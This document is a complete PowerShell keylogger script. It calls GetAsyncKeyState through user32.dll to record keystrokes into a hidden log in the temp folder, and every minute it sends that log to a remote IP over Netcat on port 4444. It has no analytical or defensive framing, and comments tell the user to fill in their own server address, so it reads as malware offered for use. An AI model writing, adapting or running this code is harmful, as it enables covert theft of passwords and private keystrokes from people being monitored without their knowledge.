Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@ 

# Remote server IP and port
$remoteIP = "10.1.13.178"  # Replace with your actual server IP
$remotePort = 4444         # Port for Netcat listener on the remote server

# Local log path
$localLogPath = "$env:TEMP\local_keylog.txt"

# List of key codes to monitor (common keys from 8 to 222)
$keys = 8..222

# Begin keylogging loop
while ($true) {
    # Capture keystrokes
    foreach ($key in $keys) {
        if ([Keyboard]::GetAsyncKeyState($key) -ne 0) {
            $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            $message = "$timestamp - Key: $key"
            # Log locally
            $message | Out-File -Append -FilePath $localLogPath
            Start-Sleep -Milliseconds 100  # Short delay to prevent duplicates
        }
    }
    # Every minute, try to send the log to the remote server
    Start-Sleep -Seconds 60
    if (Test-Connection -ComputerName $remoteIP -Count 1 -Quiet) {
        # If the remote server is reachable, send the file using Netcat
        Start-Process "cmd.exe" -ArgumentList "/c type $localLogPath | nc $remoteIP $remotePort"
    }
}
